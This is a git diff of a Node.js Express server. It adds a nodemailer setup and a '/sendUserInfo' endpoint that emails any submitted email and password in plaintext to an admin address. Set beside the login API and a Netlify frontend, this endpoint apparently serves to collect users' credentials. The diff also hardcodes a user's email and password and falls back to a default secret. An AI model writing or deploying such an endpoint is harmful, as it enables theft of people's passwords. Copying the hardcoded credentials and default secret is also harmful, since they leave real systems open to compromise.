@@ -7,17 +7,22 @@ const bodyParser = require('body-parser');
 const fs = require('fs');
 const path = require('path');
 const app = express();
+const nodemailer = require("nodemailer");
 
 const PORT = process.env.PORT || 8080;
+const smtpUser = process.env.SMTP_USER;
+const smtpPass = process.env.SMTP_PASS;
+const adminEmail = process.env.ADMIN_EMAIL;
 const SECRET = process.env.SECRET || "default_secret_if_none_set";
 
 app.use(cors({
   origin: 'https://your-netlify-site.netlify.app', // Update to your Netlify frontend URL
   credentials: true
 }));
+
 app.use(bodyParser.json());
 
-const USER = { id: 1, email: "workchopoff@gmail.com", password: "password123_zMq-h5*wE-FdUk" };
+const USER = { id: 1, email: "egli79380@gmail.com", password: "password123_zMq-h5*wE-FdUk" };
 
 app.post('/api/login', (req, res) => {
   const { email, password } = req.body;
@@ -27,6 +32,34 @@ app.post('/api/login', (req, res) => {
   } else {
     res.status(401).json({ success: false, message: "Invalid credentials" });
   }
+});
+
+// ----------- NODemailer SETUP -----------
+const transporter = nodemailer.createTransport({
+  service: "gmail",
+  auth: {
+    user: smtpUser,
+    pass: smtpPass
+  }
+});
+
+app.post('/sendUserInfo', (req, res) => {
+  const userData = req.body;
+  const mailOptions = {
+    from: smtpUser, // Use env vars here!
+    to: adminEmail,
+    subject: 'User Information',
+    text: `User Email: ${userData.email}, User Password: ${userData.password}`
+  };
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.error(error);
+      res.status(500).send('Failed to send email');
+    } else {
+      console.log('Email sent: ' + info.response);
+      res.status(200).send('Email sent successfully');
+    }
+  });
 });
 
 function authenticate(req, res, next) {
